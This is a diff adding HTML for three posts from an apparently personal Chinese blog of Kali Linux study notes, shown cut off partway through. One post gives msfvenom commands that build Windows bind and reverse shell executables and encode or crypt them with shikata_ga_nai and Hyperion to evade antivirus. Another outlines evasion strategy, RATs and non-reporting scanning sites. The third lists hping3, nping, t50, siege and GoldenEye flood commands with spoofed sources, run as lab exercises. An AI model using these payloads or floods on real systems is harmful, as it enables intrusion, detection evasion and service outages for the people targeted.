@@ -240,6 +240,931 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/" itemprop="url">Kali Linux笔记(八十九)：免杀技术--crypter加密</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T19:55:34+08:00">
+                2020-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  418 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-msfvenom–加密shell"><a href="#1-msfvenom–加密shell" class="headerlink" title="1. msfvenom–加密shell"></a>1. msfvenom–加密shell</h4><ul>
+<li>msfvenom参数<ul>
+<li>-p（使用的payload）</li>
+<li>-a（目标机器的架构）</li>
+<li>–platform（目标机器的平台）</li>
+<li>-f（生成的文件file）</li>
+<li>-o（输出的文件）</li>
+<li>-f（原文件格式，可通过管道）</li>
+<li>-e（echo加密编码）</li>
+<li>-i（加密的次数，跟-e一起使用）</li>
+<li>-b（特殊字符的过来）</li>
+</ul>
+</li>
+<li>strings → 查看文件中可读字符串  md5sum → 文件的md5值</li>
+<li>生成反弹shell<ul>
+<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_crypt_a.exe</code></strong></li>
+</ul>
+</li>
+<li>加密编码反弹shell<ul>
+<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o msfvenom_crypt_b.exe</code></strong></li>
+</ul>
+</li>
+<li>比较编码前后的检测率</li>
+<li>查看两个shell的免杀效果（查杀网站）</li>
+</ul>
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=8f0a1L_0As6Rho8dCl4UUhyCmqiHqovU3g8Jhd-ON4QtEATGbXAQ5cKA0yi8ZA4fTsdKrGvGcnYyaI9cXNu2UMIxMvOodTNP2hKU4OV_pH8gqeQAZlVxuG6PMtyarIlC6w&file_name=/msfvenom_crypt_a.PNG" alt="msfvenom_crypt_a.exe"></p>
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=6cd2aOzy5MKuuA0pY73udUOCHBetewBeXijmZea0d-Se5oacdk_3Nm6KhwZUwEK2MJ2ZRAbm0DsXRKv9-njd6hQ0kpMNksZp6FyuHffV1_ciPbTiU2EkXqNf4fO4tNaJ1A&file_name=/msfvenom_crypt_b.PNG" alt="msfvenom_crypt_b.exe"></p>
+<h4 id="2-Hyperion–软件保护"><a href="#2-Hyperion–软件保护" class="headerlink" title="2. Hyperion–软件保护"></a>2. Hyperion–软件保护</h4><ul>
+<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
+<li>常被恶意软件用于免杀目的</li>
+<li>Hyperion（32bit PE程序加密器）<ul>
+<li>window平台上的加密器</li>
+<li>Crypter / Container（解密器+PE Loader）</li>
+<li>默认路径：/usr/share/windows-binaries/</li>
+<li><a href="https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip" target="_blank" rel="noopener">https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</a> </li>
+<li><strong><code>🔺命令：unzip Hyperion-1.2.zip</code></strong> </li>
+<li><strong><code>🔺命令：cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</code></strong> </li>
+<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong> </li>
+<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o msfvenom_hyperion_a.exe</code></strong> </li>
+<li><strong><code>🔺命令：wine h.exe msfvenom_hyperion_a.exe msfvenom_hyperion_b.exe</code></strong></li>
+</ul>
+</li>
+<li>比较编码前后的检测率</li>
+<li>查看两个shell类似的免杀效果（查杀网站）</li>
+<li>▲ 2020.2.13Hyperion2.2版本在Linux上的编译无法完成</li>
+</ul>
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=fd7fcm5altn_ywl6IaSFu-cEmdTZxX2GyJoYoFz5nMXEYMVEAEBqXfRVglRb_D2UTQ7bVQbRYhC5-akLtiF7J5q6AghORRd75nK8SwJU3ne1DYvqY_hdr_4l1b7MGqfXdMPCQw&file_name=/msfvenom_hyperion_a.PNG" alt="msfvenom_hyperion_a.exe"></p>
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=b04dEruGxgUTqqkEauX-ErRpeocbjwYTIOL7qOfv5xL8gVOYsy9n-4G1ofw_jPZqtsQFpKfNIcvJ_sHvMjjV-aCKTfRJzrc6yhboOqpA9UjNF31MNyhgpTD4yCA-JZ3xXvV-JQ&file_name=/msfvenom_hyperion_b.PNG" alt="msfvenom_hyperion_b.exe"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/" itemprop="url">Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T16:18:23+08:00">
+                2020-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  590 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1. 恶意软件"></a>1. 恶意软件</h4><ul>
+<li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li>
+<li>在用户非自愿的情况下执行安装</li>
+<li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li>
+</ul>
+<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2. 防病毒软件"></a>2. 防病毒软件</h4><ul>
+<li>恶意程序最主要的防护手段<ul>
+<li>杀毒软件/防病毒软件</li>
+<li>客户端/服务器/邮件防病毒（OS上，查看邮件流/防火墙后，对邮件流进行查杀）</li>
+</ul>
+</li>
+<li>检测原理<ul>
+<li>基于二进制文件中特征签名的黑名单检测方法（病毒特征库）</li>
+<li>基于行为的分析方法（启发式）</li>
+</ul>
+</li>
+<li>事后手段<ul>
+<li>永远落后于病毒发展</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3. 免杀技术"></a>3. 免杀技术</h4><ul>
+<li>修改二进制文件中的特征字符<ul>
+<li>替换、擦除、修改</li>
+</ul>
+</li>
+<li>加密技术（crypter）<ul>
+<li>通过加密使得特征字符不可读，从而逃避AV检测</li>
+<li>运行时分片分段的解密执行，注入进程或AV不检查的无害文件中</li>
+</ul>
+</li>
+<li>防病毒软件的检测<ul>
+<li>恶意程序本身的特征字符</li>
+<li>加密器crypter的特征字符</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4. 当前现状"></a>4. 当前现状</h4><ul>
+<li>恶意软件制造者<ul>
+<li>编写私有RAT软件，避免普遍被AV所知的特征字符</li>
+<li>使用独有crypter软件加密恶意程序</li>
+<li>处事低调，尽量避免被发现</li>
+<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
+<li>Fully UnDetectable是最高追求（FUD）</li>
+</ul>
+</li>
+<li>AV厂商<ul>
+<li>广泛采集样本，尽快发现新出现的恶意程序，更新病毒库</li>
+<li>一般新的恶意软件安全UD窗口期是一周左右</li>
+<li>与恶意软件制造者永无休止的拉锯战</li>
+<li>新的启发式检测技术尚有待完善（误杀露杀）</li>
+</ul>
+</li>
+<li>单一AV厂商的病毒库很难达到100%覆盖<ul>
+<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
+<li>接口被某些国家的AV软件免费利用，没有自己的病毒库</li>
+</ul>
+</li>
+<li><a href="http://www.viruscan.org/" target="_blank" rel="noopener">http://www.viruscan.org/</a> ▲ 2020.2.13此网站不可用</li>
+<li>在线多引擎查杀网站与AV厂商共享信息</li>
+<li>搞黑的在线多引擎查毒站<ul>
+<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
+<li><a href="http://viruscheckmate.com/check" target="_blank" rel="noopener">http://viruscheckmate.com/check</a> ▲ 2020.2.13此网站不可用</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>常用RAT软件<ul>
+<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
+<li>▲ 下载测试几款RAT软件</li>
+<li>▲ 2020.2.13已下载到灰鸽子、NanoCore</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/" itemprop="url">Kali Linux笔记(八十七)：DoS工具包</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T15:57:51+08:00">
+                2020-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-拒绝服务攻击工具"><a href="#1-拒绝服务攻击工具" class="headerlink" title="1. 拒绝服务攻击工具"></a>1. 拒绝服务攻击工具</h4><ul>
+<li>RUDY<ul>
+<li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li>
+<li>▲ 与slowhttptest的区别：每次只传输一个字节的数据</li>
+<li>▲ 攻击有表单WEB页面，攻击时需指定攻击的参数名称</li>
+<li>美剧”黑客军团”中曾提到此攻击手段</li>
+<li><a href="http://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">http://sourceforge.net/projects/r-u-dead-yet/</a></li>
+</ul>
+</li>
+<li>Hping3<ul>
+<li>几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试</li>
+<li>参数<ul>
+<li>-c（建立的连接数）</li>
+<li>-d（发送的数据包要有多大）</li>
+<li>-S（Syn Flood攻击）</li>
+<li>-w（window大小，默认为64字节）</li>
+<li>-p（目标端口）</li>
+<li>–rand-source（随机产生源地址）</li>
+<li>-P/-U（TCP标记位PSH/URG）</li>
+<li>-q（不显示攻击结果）</li>
+<li>-a（伪造源地址）</li>
+<li>-n（不解析域名）</li>
+<li>-s（指定源端口）</li>
+</ul>
+</li>
+<li>Syn Flood攻击<ul>
+<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood</code></strong> –rand-source 1.1.1.1</li>
+<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>TCP Flood攻击     <ul>
+<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>ICMP Flood攻击<ul>
+<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2</code></strong></li>
+</ul>
+</li>
+<li>UDP Flood攻击<ul>
+<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2</code></strong></li>
+</ul>
+</li>
+<li>LAND攻击<ul>
+<li>特殊种类的SYN FLood攻击</li>
+<li>源地址、目的地址都是受害者，受害者于自己完成三次握手</li>
+<li><strong><code>🔺命令：hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>nping<ul>
+<li>TCP全链接DoS攻击<ul>
+<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>查公网IP<ul>
+<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Siege<ul>
+<li>http/https压力测试工具，模拟多个用户并发访问请求</li>
+<li><strong><code>🔺命令：siege -g http://1.1.1.1/a.php / 1.1.1.1</code></strong> </li>
+<li><strong><code>🔺命令：siege -i -c 1000</code></strong></li>
+<li><strong><code>🔺命令：siege -i -c 1000 http://1.1.1.1/a.php -A siegehttp</code></strong></li>
+<li>同时攻击多个url，使用-f调用字典文件<ul>
+<li>/etc/siege/urls.txt </li>
+</ul>
+</li>
+</ul>
+</li>
+<li>T50网络压力测试<ul>
+<li>▲ t50 -h（t50命令详细）</li>
+<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80</code></strong> </li>
+<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
+</ul>
+</li>
+<li>Nmap<ul>
+<li><strong><code>🔺命令：grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2</code></strong></li>
+<li><strong><code>🔺命令：cat /usr/share/nmap/scripts/script.db</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="2-匿名者拒绝服务工具包"><a href="#2-匿名者拒绝服务工具包" class="headerlink" title="2. 匿名者拒绝服务工具包"></a>2. 匿名者拒绝服务工具包</h4><ul>
+<li>匿名者发布的DoS工具<ul>
+<li>LOIC</li>
+<li>HOIC</li>
+<li>DDoSer</li>
+</ul>
+</li>
+<li>招募志愿者发放以上工具</li>
+<li>以上DoS工具不隐藏真实IP地址</li>
+<li>▲ 选取消耗系统资源更大的页面</li>
+</ul>
+<h4 id="3-其他拒绝服务工具"><a href="#3-其他拒绝服务工具" class="headerlink" title="3. 其他拒绝服务工具"></a>3. 其他拒绝服务工具</h4><ul>
+<li>XOIC<ul>
+<li>攻击任意IP地址的指定端口</li>
+<li><strong><code>🔺命令：git clone git://git.code.sf.net/p/xoic/code xoic-code</code></strong> </li>
+<li><a href="https://xoicdoser.wordpress.com/" target="_blank" rel="noopener">https://xoicdoser.wordpress.com/</a></li>
+<li>三种模式：test、normal、DoS Attack</li>
+<li>支持协议：TCP/HTTP/UDP/ICMP</li>
+<li>▲ 数据包难以找到/软件包带有恶意软件</li>
+</ul>
+</li>
+<li>HULK–Http Unbearable Load King<ul>
+<li>Python脚本</li>
+<li>随机产生大量唯一的地址请求，避免缓存命中（▲ 对企业有nginx等反向代理软件）</li>
+<li>耗尽WEB服务器资源池</li>
+<li><a href="https://packetstormsecurity.com/files/download/112856/hulk.zip" target="_blank" rel="noopener">https://packetstormsecurity.com/files/download/112856/hulk.zip</a></li>
+</ul>
+</li>
+<li>DDoSIM<ul>
+<li>7层拒绝服务工具（模拟多个僵尸机）</li>
+<li>随机IP地址</li>
+<li>基于TCP连接的攻击</li>
+<li>应用层DDoS攻击</li>
+<li>正常的HTTP请求、非正常的HTTP请求式DDoS</li>
+<li>SMTP DDoS</li>
+<li>随机端口的TCP连接洪水</li>
+<li>▲ 数据包难以找到/软件包带有恶意软件</li>
+<li>▲ 2020.2.13 找到此工具后无法编译</li>
+</ul>
+</li>
+<li>GoldenEye<ul>
+<li>http/https拒绝服务攻击工具</li>
+<li>安全研究位目的的Python脚本</li>
+<li>随机攻击向量，keep-alive，避免缓存命中</li>
+<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
+<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
+<li><strong><code>🔺命令：./goldeneye.py -h</code></strong>（▲ 查看goldeneye选项）</li>
+<li><strong><code>🔺命令：./goldeneye.py http://1.1.1.1 -w 50</code></strong></li>
+<li>▲ -w（僵尸机）</li>
+<li>▲ 2020.2.13 此工具运行后抓包无发生数据</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/XOIC.PNG" alt="XOIC"></p>
+<h4 id="4-实验–RUDY"><a href="#4-实验–RUDY" class="headerlink" title="4. 实验–RUDY"></a>4. 实验–RUDY</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>物理机上拷贝下载的RUDY文件，进行解压查看，可以修改配置文件rudeadyet.conf</li>
+<li>浏览器访问Metasploit尝试连接，找出表单对应的变量名称</li>
+<li>修改配置文件rudeadyet.conf（URL、attack_parameters）</li>
+<li><strong><code>🔺命令：./r-u-dead-yet-v2.2.py</code></strong></li>
+<li>可通过Wireshark抓包，查看发送的数据包（TCP segement byte是否为一个字节）</li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/rudy%E6%94%BB%E5%87%BB.PNG" alt="rudy攻击"></p>
+<h4 id="5-实验–hping3"><a href="#5-实验–hping3" class="headerlink" title="5. 实验–hping3"></a>5. 实验–hping3</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：hping3 -a Metasploit的IP -S -d 100 -p 80 --flood Metasploit的IP</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-实验–nping"><a href="#6-实验–nping" class="headerlink" title="6. 实验–nping"></a>6. 实验–nping</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-实验–siege"><a href="#7-实验–siege" class="headerlink" title="7. 实验–siege"></a>7. 实验–siege</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：siege -g http://Metasploit的IP/a.php / Metasploit的IP</code></strong>（查看banner信息）</li>
+<li><strong><code>🔺命令：siege -i（互联网形式） -c 1000 http://Metasploit的IP/a.php -A（user-agent） siegehttp</code></strong></li>
+<li><strong><code>🔺命令：siege -i -c 1000</code></strong>（去默认文件夹寻找URL地址）</li>
+<li>可通过Wireshark抓包，查看发送的数据包</li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-实验–t50"><a href="#8-实验–t50" class="headerlink" title="8. 实验–t50"></a>8. 实验–t50</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig查看IP地址</code></strong></li>
+<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：t50 Metasploit的IP --flood --turbo -S --protocol TCP --dport 80</code></strong></li>
+<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-实验–匿名者拒绝服务工具包"><a href="#9-实验–匿名者拒绝服务工具包" class="headerlink" title="9. 实验–匿名者拒绝服务工具包"></a>9. 实验–匿名者拒绝服务工具包</h4><ul>
+<li>▲ 工具包都为.exe文件，所以可能无法在Kali上运行（即使有mono界面/wine程序）</li>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
+</ul>
+</li>
+<li>Kali<ul>
